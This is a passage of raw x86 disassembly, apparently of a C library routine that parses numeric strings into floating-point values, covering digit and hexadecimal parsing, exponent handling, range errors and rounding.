je 0x8088e66
bsr edx, edi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_15ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x35
jle 0x8088f2c
add edx, 0x35
mov eax, edi
mov dword [var_214h], 0x56
sub ecx, edx
mov dword [var_200h], edx
shr eax, cl
mov dword [var_158h], eax
mov ecx, dword [var_214h]
cmp ecx, 0x35
mov dword [var_170h], ecx
jle 0x8088d62
mov esi, dword [var_16ch]
mov eax, dword [ebp + esi*4 - 0xac]
test eax, eax
mov edx, dword [var_16ch]
jne 0x8088edd
test edx, edx
js 0x8088edd
dec edx
mov ebx, dword [ebp + edx*4 - 0xac]
test ebx, ebx
jne 0x8088edd
test edx, edx
jns 0x8088ecd
mov ecx, dword [var_1dch]
xor eax, eax
test ecx, ecx
jne 0x8088eed
test edx, edx
js 0x8088ef2
mov eax, 1
mov dword [var_14h], eax
lea edx, [var_158h]
mov dword [var_ch], edi
mov eax, 0x1f
mov dword [esp], edx
sub eax, dword [var_200h]
mov dword [var_10h], eax
mov eax, dword [var_164h]
mov dword [var_8h], eax
mov eax, dword [var_15ch]
dec eax
mov dword [var_4h], eax
jmp 0x808894e
neg edx
mov dword [var_154h], 0
mov dword [var_158h], edi
add edx, 0x20
mov dword [var_214h], edx
jmp 0x8088e9d
mov eax, dword [var_170h]
add eax, 0x20
cmp eax, 0x35
mov dword [var_214h], eax
jg 0x8088f77
mov eax, dword [var_158h]
mov dword [var_158h], edi
mov dword [var_154h], eax
jmp 0x8088e9d
mov dword [var_200h], 0x35
mov edx, dword [var_170h]
sub dword [var_200h], edx
mov eax, dword [var_200h]
test eax, eax
jle 0x8088e9d
mov ecx, dword [var_200h]
lea eax, [var_158h]
mov dword [var_8h], 2
mov dword [var_4h], eax
mov dword [esp], eax
mov dword [var_ch], ecx
call fcn.0808c6f0
mov eax, edi
mov ecx, 0x20
sub ecx, dword [var_200h]
shr eax, cl
or dword [var_158h], eax
jmp 0x8088e9d
jne 0x8088dc0
mov eax, dword [var_16ch]
cmp ebx, dword [ebp + eax*4 - 0xb4]
ja 0x8088d92
jmp 0x8088dc0
mov dword [var_200h], 0x35
mov edx, dword [var_170h]
sub dword [var_200h], edx
cmp dword [var_200h], 0x1f
jle 0x8089083
mov ebx, dword [var_200h]
mov ecx, dword [var_200h]
mov dword [var_8h], 2
add ebx, 0x1f
cmp dword [var_200h], 0xffffffff
cmovg ebx, dword [var_200h]
sar ebx, 5
mov eax, ebx
shl eax, 5
sub ecx, eax
lea eax, [var_158h]
mov dword [var_4h], eax
mov dword [var_ch], ecx
lea eax, [ebp + ebx*4 - 0x158]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
dec eax
js 0x8088d14
lea edx, [ebp + eax*4 - 0x158]
mov dword [edx], 0
sub edx, 4
dec eax
jns 0x8089072
jmp 0x8088d14
mov eax, dword [var_200h]
test eax, eax
jle 0x8088d14
mov edx, dword [var_200h]
lea ecx, [var_158h]
mov dword [var_8h], 2
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
jmp 0x8088d14
lea esi, [esi]
test eax, eax
mov ecx, eax
jle 0x80890e2
mov eax, dword [var_204h]
lea edx, [eax + ecx]
mov eax, dword [ebp + ecx*4 - 0xb0]
dec ecx
test ecx, ecx
mov dword [ebp + edx*4 - 0xac], eax
jg 0x80890c6
mov edx, dword [var_204h]
xor eax, eax
inc edx
cmp eax, edx
jge 0x80890ff
mov dword [ebp + eax*4 - 0xac], 0
inc eax
cmp eax, edx
jl 0x80890ef
shl dword [var_204h], 5
mov edx, dword [var_204h]
sub dword [var_15ch], edx
jmp 0x8088d27
test eax, eax
mov edx, eax
jle 0x8088d27
mov eax, dword [ebp + edx*4 - 0xb0]
mov dword [ebp + edx*4 - 0xac], eax
dec edx
test edx, edx
jg 0x8089121
jmp 0x8088d27
cmp dword [var_160h], 1
mov eax, dword [var_148h]
mov dword [var_1f4h], 0
mov dword [var_1f8h], 0
mov edi, dword [var_14ch]
mov dword [var_1f0h], eax
jle 0x8089389
mov esi, dword [var_a8h]
mov ebx, dword [var_ach]
cmp dword [var_170h], 0x35
jg 0x808924d
cmp esi, dword [var_1f0h]
je 0x8089355
mov eax, ebx
mov edx, esi
div dword [var_1f0h]
mov ecx, edx
mov dword [var_1f4h], eax
mul edi
mov esi, edx
mov ebx, eax
cmp esi, ecx
ja 0x80891b3
jne 0x80891cc
test ebx, ebx
je 0x80891cc
add ecx, dword [var_1f0h]
dec dword [var_1f4h]
sub ebx, edi
sbb esi, 0
cmp ecx, dword [var_1f0h]
jae 0x80891a9
xor eax, eax
sub eax, ebx
sbb ecx, esi
mov esi, ecx
mov ebx, eax
mov eax, dword [var_170h]
test eax, eax
jne 0x80892be
mov eax, dword [var_1f4h]
mov edx, 0x20
test eax, eax
je 0x80891fd
bsr edx, dword [var_1f4h]
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_15ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x35
jle 0x8089298
mov eax, dword [ebp - 0x1f4]
add edx, 0x35
mov dword [ebp - 0x214], 0x56
sub ecx, edx
mov dword [ebp - 0x1f8], edx
shr eax, cl
mov dword [ebp - 0x158], eax
mov eax, dword [ebp - 0x214]
cmp eax, 0x35
mov dword [ebp - 0x170], eax
jle 0x8089185
mov ecx, dword [var_1dch]
xor eax, eax
test ecx, ecx
jne 0x8089261
test esi, esi
jne 0x8089261
test ebx, ebx
je 0x8089266
mov eax, 1
mov dword [var_14h], eax
mov edx, dword [var_1f4h]
mov eax, 0x1f
sub eax, dword [var_1f8h]
mov dword [var_ch], edx
mov dword [var_10h], eax
mov ecx, dword [var_164h]
mov eax, dword [var_15ch]
mov dword [var_8h], ecx
jmp 0x8088940
mov ecx, dword [ebp - 0x1f4]
neg edx
mov dword [ebp - 0x154], 0
add edx, 0x20
mov dword [ebp - 0x214], edx
mov dword [ebp - 0x158], ecx
jmp 0x8089238
mov eax, dword [var_170h]
add eax, 0x20
cmp eax, 0x35
mov dword [var_214h], eax
jg 0x80892ef
mov eax, dword [var_158h]
mov edx, dword [var_1f4h]
mov dword [var_154h], eax
mov dword [var_158h], edx
jmp 0x8089238
mov dword [var_1f8h], 0x35
mov ecx, dword [var_170h]
sub dword [var_1f8h], ecx
mov eax, dword [var_1f8h]
test eax, eax
jle 0x8089238
mov eax, dword [ebp - 0x1f8]
lea edx, [ebp - 0x158]
mov dword [esp + 8], 2
mov dword [esp + 4], edx
mov dword [esp], edx
mov dword [esp + 0xc], eax
call fcn.0808c6f0
mov eax, dword [ebp - 0x1f4]
mov ecx, 0x20
sub ecx, dword [ebp - 0x1f8]
shr eax, cl
or dword [ebp - 0x158], eax
jmp 0x8089238
lea ecx, [esi + ebx]
mov dword [var_1f4h], 0xffffffff
cmp ecx, esi
jb 0x8089379
test edi, edi
mov esi, edi
lea eax, [edi - 1]
mov ebx, edi
cmovne esi, eax
neg ebx
jmp 0x80891a9
sub ecx, edi
xor ebx, ebx
mov esi, ecx
add ebx, edi
adc esi, 0
jmp 0x80891d6
mov eax, dword [var_ach]
cmp eax, dword [var_1f0h]
jb 0x80893a0
xor esi, esi
mov ebx, eax
jmp 0x8089178
mov ecx, dword [var_170h]
test ecx, ecx
jle 0x8089429
mov ebx, dword [var_170h]
add ebx, 0x20
cmp ebx, 0x35
jg 0x80893e3
mov eax, dword [var_158h]
mov dword [var_158h], 0
mov dword [var_154h], eax
mov eax, dword [var_ach]
mov dword [var_170h], ebx
mov esi, eax
xor ebx, ebx
jmp 0x8089178
mov dword [var_1f8h], 0x35
mov edx, dword [var_170h]
sub dword [var_1f8h], edx
mov edx, dword [var_1f8h]
test edx, edx
jle 0x80893d4
mov ecx, dword [var_1f8h]
lea esi, [var_158h]
mov dword [var_8h], 2
mov dword [var_4h], esi
mov dword [esp], esi
mov dword [var_ch], ecx
call fcn.0808c6f0
jmp 0x80893ce
mov ebx, dword [var_170h]
sub ebx, 0x20
mov dword [var_15ch], ebx
jmp 0x80893da
lea esi, [esi]
mov dword [var_1ech], 0
mov ebx, dword [var_ach]
mov edi, dword [var_14ch]
xor eax, eax
mov edx, ebx
div edi
mov esi, eax
mov ebx, edx
mov eax, dword [var_170h]
test eax, eax
jne 0x808950b
test esi, esi
mov edx, 0x20
je 0x808947d
bsr edx, esi
xor edx, 0x1f
mov ecx, 0x20
sub dword [var_15ch], edx
mov eax, ecx
sub eax, edx
cmp eax, 0x35
jle 0x80894ee
add edx, 0x35
mov eax, esi
mov dword [var_214h], 0x56
sub ecx, edx
mov dword [var_1ech], edx
shr eax, cl
mov dword [var_158h], eax
mov edx, dword [var_214h]
cmp edx, 0x35
mov dword [var_170h], edx
jle 0x8089456
mov edi, dword [var_1dch]
xor eax, eax
test edi, edi
jne 0x80894d1
test ebx, ebx
je 0x80894d6
mov eax, 1
mov dword [var_14h], eax
mov dword [var_ch], esi
mov eax, 0x1f
sub eax, dword [var_1ech]
jmp 0x808927f
neg edx
mov dword [var_154h], 0
mov dword [var_158h], esi
add edx, 0x20
mov dword [var_214h], edx
jmp 0x80894b0
mov ecx, dword [var_170h]
add ecx, 0x20
cmp ecx, 0x35
mov dword [var_214h], ecx
jg 0x8089536
mov eax, dword [var_158h]
mov dword [var_158h], esi
mov dword [var_154h], eax
jmp 0x80894b0
mov dword [var_1ech], 0x35
mov eax, dword [var_170h]
sub dword [var_1ech], eax
mov eax, dword [var_1ech]
test eax, eax
jle 0x80894b0
mov edx, dword [var_1ech]
lea ecx, [var_158h]
mov dword [var_8h], 2
mov dword [var_4h], ecx
mov dword [esp], ecx
mov dword [var_ch], edx
call fcn.0808c6f0
mov eax, esi
mov ecx, 0x20
sub ecx, dword [var_1ech]
shr eax, cl
or dword [var_158h], eax
jmp 0x80894b0
mov ecx, dword [var_16ch]
lea edi, [var_14ch]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x8088b19
mov edx, dword [var_1e8h]
mov ecx, dword [var_16ch]
mov esi, dword [var_1e0h]
mov dword [var_10h], ecx
mov ecx, dword [var_1e4h]
mov dword [var_ch], esi
mov eax, dword [edx + 4]
sub eax, 2
mov dword [var_8h], eax
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
mov dword [var_4h], eax
call fcn.0808c7c0
mov edi, dword [var_1e0h]
mov esi, dword [var_1e8h]
mov edx, dword [var_16ch]
add edx, dword [esi + 4]
mov esi, dword [var_1e4h]
mov dword [var_1e4h], edi
mov dword [var_1e0h], esi
lea ecx, [edx - 2]
sub edx, 3
test eax, eax
cmovne edx, ecx
mov dword [var_16ch], edx
jmp 0x8088af4
mov dword [ebp + eax*4 - 0x158], 0
jmp 0x8088a15
mov eax, dword [var_170h]
mov edx, dword [var_170h]
add eax, 0x1e
dec edx
cmovns eax, edx
mov dword [var_1d4h], edx
and eax, 0xffffffe0
sub edx, eax
cmp edx, 0x14
je 0x8089765
cmp edx, 0x13
jg 0x80896ff
mov ecx, dword [var_1c0h]
mov eax, 0x14
mov ebx, 2
sub eax, edx
lea esi, [var_ach]
mov dword [var_ch], eax
mov dword [var_4h], esi
mov eax, ebx
sub eax, ecx
mov dword [var_8h], ecx
lea eax, [ebp + eax*4 - 0x158]
mov dword [esp], eax
call fcn.0808c6f0
mov eax, ebx
sub eax, dword [var_160h]
test eax, eax
jle 0x80896c5
lea edx, [var_158h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x80896b9
mov ecx, dword [var_164h]
mov esi, dword [var_1d4h]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], ecx
mov dword [var_4h], esi
lea eax, [var_158h]
mov dword [esp], eax
jmp 0x808894e
lea eax, [edx - 0x14]
lea edi, [var_158h]
lea edx, [var_ach]
mov dword [var_ch], eax
mov dword [var_4h], edx
mov eax, dword [var_1c0h]
mov dword [var_8h], eax
mov eax, 2
sub eax, dword [var_1c0h]
lea eax, [edi + eax*4]
mov dword [esp], eax
call fcn.0808c750
mov edx, 1
sub edx, dword [var_160h]
test edx, edx
mov dword [ebp + edx*4 - 0x158], eax
jle 0x80896c5
mov ecx, edi
mov eax, edx
mov dword [ecx], 0
add ecx, 4
dec eax
jne 0x8089754
jmp 0x80896c5
mov eax, 2
mov ecx, dword [var_1c0h]
lea esi, [var_ach]
mov edi, eax
sub edi, dword [var_1c0h]
cld
shl ecx, 2
shr ecx, 2
lea edi, [ebp + edi*4 - 0x158]
rep movsd dword es:[edi], dword ptr [esi]
sub eax, dword [var_160h]
test eax, eax
jle 0x80896c5
lea edx, [var_158h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x80897a2
jmp 0x80896c5
mov ecx, dword [var_160h]
lea edi, [var_ach]
mov esi, eax
cld
shl ecx, 2
shr ecx, 2
rep movsd dword es:[edi], dword ptr [esi]
jmp 0x8088829
mov dword [var_10h], edx
mov ecx, dword [var_1b4h]
mov dword [var_8h], esi
mov edx, dword [var_1bch]
mov dword [var_ch], ecx
mov ecx, dword [var_1b8h]
mov eax, dword [edx]
mov dword [esp], ecx
lea eax, [eax*4 + 0x80a6248]
jmp 0x80887c4
call fcn.08048b20
mov dword [eax], 0x22
jmp 0x8088385
mov ecx, dword [var_184h]
mov eax, ebx
neg ecx
cmp ebx, ecx
jge 0x80886aa
mov eax, ecx
jmp 0x80886aa
mov eax, dword [var_174h]
mov ecx, dword [arg_14h]
mov dword [var_1b0h], 1
mov esi, 0x14
movzx edx, byte [eax]
mov edi, dword [ecx + 0x34]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x8089868
inc dword [var_174h]
mov eax, dword [var_174h]
movzx edx, byte [eax]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
je 0x808984f
cmp dl, 0x30
je 0x8089a26
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x8089a0f
inc dword [var_174h]
mov edx, eax
mov eax, dword [edx*4 + 0x80a6160]
dec dword [var_180h]
mov dword [var_170h], eax
mov eax, esi
sub eax, dword [var_170h]
lea ecx, [eax + 1]
mov esi, eax
shl edx, cl
mov ecx, dword [var_170h]
mov dword [var_154h], edx
mov edx, dword [var_184h]
lea eax, [ecx + edx*4]
add eax, dword [var_15ch]
lea ebx, [eax - 5]
mov eax, dword [var_180h]
mov dword [var_15ch], ebx
test eax, eax
jle 0x808994c
mov eax, dword [var_1b0h]
lea ebx, [ebp + eax*4 - 0x158]
mov ecx, dword [var_174h]
movzx edx, byte [ecx]
movsx eax, dl
test byte [edi + eax*2 + 1], 0x10
jne 0x8089909
mov eax, dword [var_198h]
add ecx, eax
mov dword [var_174h], ecx
movzx edx, byte [ecx]
movsx edx, dl
lea eax, [edx - 0x30]
cmp eax, 9
ja 0x80899f8
inc dword [var_174h]
mov edx, eax
lea eax, [esi + 1]
cmp eax, 3
jle 0x808999f
lea ecx, [esi - 3]
sub esi, 4
shl edx, cl
or dword [ebx], edx
dec dword [var_180h]
mov eax, dword [var_180h]
test eax, eax
jle 0x808994c
mov eax, dword [var_1b0h]
test eax, eax
jns 0x80898e5
mov ebx, dword [var_1b0h]
test ebx, ebx
jle 0x808996e
lea edx, [var_158h]
mov eax, dword [var_1b0h]
mov dword [edx], 0
add edx, 4
dec eax
jne 0x8089962
mov esi, dword [var_164h]
mov eax, dword [var_15ch]
mov dword [var_14h], 0
mov dword [var_10h], 0
mov dword [var_ch], 0
mov dword [var_8h], esi
mov dword [var_4h], eax
jmp 0x80896f1
mov ecx, 3
mov eax, edx
sub ebx, 4
sub ecx, esi
shr eax, cl
lea ecx, [esi + 0x1d]
or dword [ebx + 4], eax
shl edx, cl
dec dword [var_1b0h]
js 0x80899c7
mov dword [ebx], edx
add esi, 0x1c
jmp 0x8089932
xor eax, eax
mov ecx, dword [var_164h]
mov dword [var_10h], 0x1f
cmp dword [var_180h], 0
mov dword [var_ch], edx
setg al
mov dword [var_8h], ecx
mov dword [var_14h], eax
mov eax, dword [var_15ch]
jmp 0x8088941
mov ecx, dword [arg_14h]
inc dword [var_174h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x8089920
mov ecx, dword [arg_14h]
inc dword [var_174h]
mov eax, dword [ecx + 0x38]
mov edx, dword [eax + edx*4]
sub edx, 0x57
jmp 0x8089888
inc dword [var_174h]
mov ecx, dword [var_174h]
movzx edx, byte [ecx]
cmp dl, 0x30
je 0x8089a26
jmp 0x8089871
mov eax, dword [var_188h]
mov edx, dword [var_15ch]
shl eax, 2
sub edx, eax
jmp 0x808866a
test al, al
jne 0x8088602
jmp 0x808863f
mov ecx, dword [var_18ch]
movzx eax, byte [ecx + 1]
jmp 0x8089a55
mov edx, dword [arg_ch]
test edx, edx
jne 0x8088380
jmp 0x8088385
mov ecx, dword [arg_ch]
test ecx, ecx
je 0x8088385
mov eax, dword [arg_8h]
mov esi, dword [arg_ch]
mov dword [esi], eax
jmp 0x8088385
mov eax, dword [var_18ch]
movzx eax, byte [eax]
mov byte [var_206h], al
mov edx, dword [var_180h]
xor eax, eax
test edx, edx
mov dword [var_184h], edx
setne al
xor ebx, ebx
dec eax
cmp byte [var_206h], 0
mov dword [var_188h], eax
je 0x8089e22
mov ecx, dword [var_18ch]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x8089aeb
mov edx, dword [var_18ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x8089ad7
test al, al
jne 0x8089e1b
add edi, dword [var_198h]
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
ja 0x8089ddd
mov eax, dword [arg_14h]
mov ecx, dword [eax + 0x38]
mov edx, esi
cmp dl, 0x30
je 0x8089b34
mov eax, dword [var_180h]
sub eax, dword [var_184h]
cmp dword [var_188h], 0xffffffff
cmovne eax, dword [var_188h]
mov dword [var_188h], eax
inc dword [var_180h]
inc edi
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8089b0d
cmp dword [var_168h], 0x10
mov edx, esi
movsx eax, dl
jne 0x8089b60
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x8089b60
cmp edx, 0x66
jle 0x8089b0d
cmp dword [var_168h], 0x10
mov dword [var_17ch], edi
je 0x8089dd4
cmp dword [ecx + eax*4], 0x65
je 0x8089c61
mov esi, dword [var_184h]
cmp dword [var_180h], esi
jle 0x8089b9b
mov eax, dword [var_17ch]
cmp byte [eax - 1], 0x30
je 0x8089c44
mov ecx, dword [var_184h]
cmp dword [var_180h], ecx
jne 0x808859b
mov ebx, dword [var_180h]
test ebx, ebx
jle 0x808859b
mov ebx, dword [var_15ch]
test ebx, ebx
jns 0x808859b
cmp dword [var_168h], 0x10
je 0x8089c28
mov eax, dword [var_17ch]
movzx ecx, byte [eax - 1]
movsx eax, cl
sub eax, 0x30
cmp eax, 9
ja 0x8089c20
cmp cl, 0x30
jne 0x808859b
dec dword [var_180h]
inc ebx
dec dword [var_17ch]
mov ecx, dword [var_180h]
dec dword [var_184h]
mov dword [var_15ch], ebx
test ecx, ecx
jle 0x808859b
test ebx, ebx
js 0x8089bc9
jmp 0x808859b
dec dword [var_17ch]
jmp 0x8089bc9
mov esi, dword [var_17ch]
movzx ecx, byte [esi - 1]
mov esi, dword [arg_14h]
mov eax, dword [esi + 0x34]
movsx edx, cl
test byte [eax + edx*2 + 1], 0x10
jne 0x8089be7
jmp 0x8089c20
dec dword [var_17ch]
dec dword [var_180h]
mov edx, dword [var_17ch]
cmp byte [edx - 1], 0x30
je 0x8089c44
jmp 0x8089b9b
inc edi
mov dword [var_1ach], 0
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x2d
je 0x8089dc8
cmp al, 0x2b
je 0x8089dbf
lea eax, [esi - 0x30]
cmp al, 9
ja 0x8089db4
cmp dword [var_168h], 0x10
je 0x8089d81
mov eax, dword [var_1ach]
test eax, eax
je 0x8089d6a
mov edx, dword [var_184h]
add edx, 0x168
mov eax, dword [var_15ch]
lea eax, [eax + eax*4]
lea ebx, [eax + eax]
cmp ebx, edx
mov dword [var_15ch], ebx
jg 0x8089cfe
mov ecx, esi
inc edi
movsx eax, cl
lea ebx, [eax + ebx - 0x30]
mov dword [var_15ch], ebx
movzx esi, byte [edi]
lea eax, [esi - 0x30]
cmp al, 9
jbe 0x8089cb3
mov esi, dword [var_1ach]
test esi, esi
je 0x8089b7d
neg ebx
mov dword [var_15ch], ebx
jmp 0x8089b7d
cmp dword [var_188h], 0xffffffff
je 0x8089d58
call fcn.08048b20
mov dword [eax], 0x22
mov eax, dword [var_1ach]
test eax, eax
jne 0x8089d54
mov eax, dword [var_164h]
test eax, eax
je 0x8089d4c
fld dword [0x80a6100]
inc edi
movzx eax, byte [edi]
sub eax, 0x30
cmp al, 9
jbe 0x8089d2c
mov eax, dword [arg_ch]
test eax, eax
je 0x80882b6
mov ecx, dword [arg_ch]
mov dword [ecx], edi
jmp 0x80882b6
fld dword [0x80a61a0]
jmp 0x8089d2c
fldz
jmp 0x8089d2c
mov eax, dword [var_164h]
test eax, eax
je 0x8089d54
fld dword [0x80a6104]
jmp 0x8089d2c
mov eax, dword [var_188h]
sub eax, dword [var_184h]
lea edx, [eax + 0x134]
jmp 0x8089cb3
mov eax, dword [var_1ach]
mov ecx, dword [var_184h]
test eax, eax
lea edx, [ecx*4 + 0x432]
jne 0x8089cb3
mov edx, dword [var_188h]
mov eax, ecx
shl eax, 2
sub edx, eax
lea edx, [edx + 0x400]
jmp 0x8089cb3
mov edi, dword [var_17ch]
jmp 0x8089b7d
inc edi
movzx esi, byte [edi]
jmp 0x8089c81
mov dword [var_1ach], 1
jmp 0x8089dbf
cmp dword [ecx + eax*4], 0x70
jmp 0x8089b77
cmp dword [var_168h], 0x10
je 0x8089df6
mov ecx, esi
movsx eax, cl
mov esi, dword [arg_14h]
mov ecx, dword [esi + 0x38]
jmp 0x8089b60
mov edx, esi
movsx eax, dl
mov edx, dword [arg_14h]
mov ecx, dword [edx + 0x38]
mov edx, dword [ecx + eax*4]
cmp edx, 0x60
jle 0x8089b60
cmp edx, 0x66
jle 0x8089b0d
jmp 0x8089b60
mov edx, esi
movsx eax, dl
jmp 0x8089deb
mov ecx, dword [var_18ch]
movzx eax, byte [ecx]
jmp 0x8089aeb
mov ecx, dword [var_190h]
movzx eax, byte [ecx]
jmp 0x80884e6
mov edx, dword [arg_14h]
mov ecx, esi
movsx eax, cl
mov ecx, dword [edx + 0x38]
mov eax, dword [ecx + eax*4]
cmp eax, 0x60
jbe 0x80884ab
cmp eax, 0x66
ja 0x80884ab
mov esi, esi
inc dword [var_180h]
jmp 0x80884e0
mov eax, dword [arg_14h]
mov edx, esi
mov ecx, dword [eax + 0x38]
cmp dl, byte [ecx + 0x184]
jl 0x8089e87
cmp dl, byte [ecx + 0x198]
jle 0x8088483
xor ebx, ebx
cmp byte [var_205h], 0
je 0x8088483
mov ecx, dword [var_18ch]
movzx eax, byte [ecx]
cmp al, byte [ebx + edi]
jne 0x8088483
mov edx, dword [var_18ch]
inc ebx
movzx eax, byte [ebx + edx]
test al, al
jne 0x8089e9f
jmp 0x8088483
lea esi, [esi]
mov ecx, dword [var_190h]
movzx eax, byte [ecx]
jmp 0x808846b
mov ecx, esi
cmp cl, 0x30
jne 0x808846f
inc edi
movzx esi, byte [edi]
mov eax, esi
cmp al, 0x30
je 0x8089ed9
jmp 0x808846f
mov edx, dword [arg_14h]
movsx eax, byte [edi + 1]
mov ecx, dword [edx + 0x38]
cmp dword [ecx + eax*4], 0x78
jne 0x8088414
add edi, 2
mov dword [var_168h], 0x10
movzx esi, byte [edi]
mov dword [var_194h], 0
jmp 0x8088414
test al, al
jne 0x808823d
jmp 0x808822d
mov edx, dword [var_18ch]
movzx eax, byte [edx]
jmp 0x8089f1b
inc edi
movzx esi, byte [edi]
jmp 0x80881f4
mov dword [var_164h], 1
jmp 0x8089f33
nop
lea esi, [esi]
push ebp
mov ebp, esp
sub esp, 0x10
mov eax, dword [arg_10h]
mov dword [var_8h], 0
mov dword [var_ch], eax
mov eax, dword [arg_ch]
mov dword [var_4h], eax
mov eax, dword [arg_8h]
mov dword [esp], eax
call fcn.08088130
leave
ret
nop
nop
nop
nop
nop
nop
nop
push ebp
mov ebp, esp
push edi
push esi
push ebx
sub esp, 0x20
mov esi, dword [arg_1ch]
mov ecx, dword [arg_14h]
mov eax, dword [arg_ch]
mov edx, dword [arg_10h]
mov edi, dword [arg_8h]
mov dword [var_18h], ecx
mov dword [var_10h], eax
mov dword [var_14h], edx
cmp dword [var_10h], 0xffffc002
mov eax, dword [arg_18h]
mov dword [var_1ch], eax
jge 0x808a0a6
mov ebx, 0xffffc002
sub ebx, dword [var_10h]
cmp ebx, 0x40
jg 0x808a202
movzx ecx, byte [var_1ch]
mov eax, 1
mov edx, esi
or edx, 1
shl eax, cl
dec eax
test dword [var_18h], eax
cmovne esi, edx
cmp ebx, 0x40
je 0x808a1ce
cmp ebx, 0x1f
jle 0x808a19e
mov ecx, ebx
lea eax, [ebx + 0x1e]
dec ecx
cmovns eax, ecx
sar eax, 5
mov edx, dword [edi + eax*4]
shl eax, 5
mov dword [var_18h], edx
mov edx, ecx
sub edx, eax
mov dword [var_1ch], edx
xor edx, edx
lea esi, [esi]
cmp ecx, 0xffffffff
lea eax, [ebx + 0x1e]
cmovg eax, ecx
sar eax, 5
cmp edx, eax
jge 0x808a02f
mov eax, esi
or eax, 1
cmp dword [edi + edx*4], 0
cmovne esi, eax
inc edx
jmp 0x808a010
movzx ecx, byte [var_1ch]
mov eax, 1
mov edx, esi
or edx, 1
shl eax, cl
mov ecx, ebx
dec eax
test dword [var_18h], eax
mov dword [esp], edi
cmovne esi, edx
cmp ebx, 0xffffffff
lea edx, [ebx + 0x1f]
cmovg edx, ebx
sar edx, 5
mov eax, edx
shl eax, 5
sub ecx, eax
mov eax, 2
sub eax, edx
mov dword [var_sp_ch], ecx
lea edx, [edi + edx*4]
mov dword [var_4h], edx
mov dword [var_sp_8h], eax
call fcn.0808c750
xor edx, edx
nop
lea esi, [esi]
cmp ebx, 0xffffffff
lea eax, [ebx + 0x1f]
cmovg eax, ebx
sar eax, 5
cmp edx, eax
jge 0x808a09f
mov ecx, edx
inc edx
sub ecx, eax
mov dword [edi + ecx*4 + 8], 0
jmp 0x808a080
mov dword [var_10h], 0xffffc001
movzx ecx, byte [var_1ch]
mov eax, dword [var_18h]
shr eax, cl
test al, 1
je 0x808a122
test esi, esi
jne 0x808a197
mov edx, dword [edi]
test dl, 1
jne 0x808a0d0
mov eax, 1
shl eax, cl
dec eax
test dword [var_18h], eax
je 0x808a122
nop
lea eax, [edx + 1]
lea ebx, [edi + 4]
mov esi, 2
cmp eax, edx
mov dword [edi], eax
mov ecx, ebx
jae 0x808a163
mov eax, dword [edi + 4]
lea ebx, [edi + 8]
mov esi, 1
mov ecx, ebx
inc eax
test eax, eax
mov dword [edi + 4], eax
jne 0x808a163
inc dword [var_10h]
mov dword [esp], edi
mov dword [var_4h], edi
mov dword [var_sp_ch], 1
mov dword [var_sp_8h], 2
call fcn.0808c750
or dword [edi + 4], 0x80000000
cmp dword [var_10h], 0x4000
jle 0x808a148
mov eax, dword [var_14h]
test eax, eax
je 0x808a140
fld dword [0x80a6100]
add esp, 0x20
pop ebx
pop esi
pop edi
leave
ret
fld dword [0x80a61a0]
jmp 0x808a138
mov eax, dword [var_14h]
mov edx, dword [var_10h]
mov dword [arg_8h], edi
mov dword [arg_10h], eax
mov dword [arg_ch], edx
add esp, 0x20
pop ebx
pop esi
pop edi
leave
jmp 0x808d8e0
cmp ecx, ebx
je 0x808a17b
xor edx, edx
dec esi
cmp edx, esi
jge 0x808a17b
mov esi, esi
mov eax, dword [ebx + edx*4]
mov dword [ecx + edx*4], eax
inc edx
cmp edx, esi
jl 0x808a170
cmp dword [var_10h], 0xffffc001
jne 0x808a122
mov edx, dword [edi + 4]
mov eax, 0xffffc002
test edx, edx
cmovns eax, dword [var_10h]
mov dword [var_10h], eax
jmp 0x808a122
mov edx, dword [edi]
jmp 0x808a0d0
test ebx, ebx
jle 0x808a09f
mov eax, dword [edi]
lea edx, [ebx - 1]
mov dword [var_1ch], edx
mov dword [var_18h], eax
mov dword [esp], edi
mov dword [var_4h], edi
mov dword [var_sp_ch], ebx
mov dword [var_sp_8h], 2
call fcn.0808c750
jmp 0x808a09f
mov eax, dword [edi + 4]
mov dword [var_1ch], 0x1f
xor edx, edx
mov dword [var_18h], eax
mov ecx, dword [edi + edx*4]
mov eax, esi
or eax, 1
test ecx, ecx
cmovne esi, eax
inc edx
cmp edx, 1
jle 0x808a1dd
mov dword [edi], 0
mov dword [edi + 4], 0
jmp 0x808a09f
call fcn.08048b20
fldz
mov dword [eax], 0x21
jmp 0x808a138
lea esi, [esi]
lea edi, [edi]
push ebp
mov ebp, esp
push edi
xor edi, edi
push esi
xor esi, esi
push ebx
sub esp, 0x18
mov eax, dword [arg_14h]
mov ebx, dword [arg_8h]
mov dword [eax], 0
lea esi, [esi]
cmp edi, 9
je 0x808a399
movzx ecx, byte [ebx]
lea eax, [ecx - 0x30]
cmp al, 9
jbe 0x808a26b
mov eax, dword [arg_24h]
test eax, eax
je 0x808a265
mov eax, dword [arg_24h]
cmp cl, byte [eax]
je 0x808a35f
add ebx, dword [arg_20h]
movzx ecx, byte [ebx]
movsx eax, cl
dec dword [arg_ch]
lea edx, [esi + esi*4]
lea esi, [eax + edx*2 - 0x30]
inc ebx
inc edi
mov eax, dword [arg_ch]
test eax, eax
jg 0x808a240
mov edx, dword [arg_18h]
mov eax, dword [edx]
test eax, eax
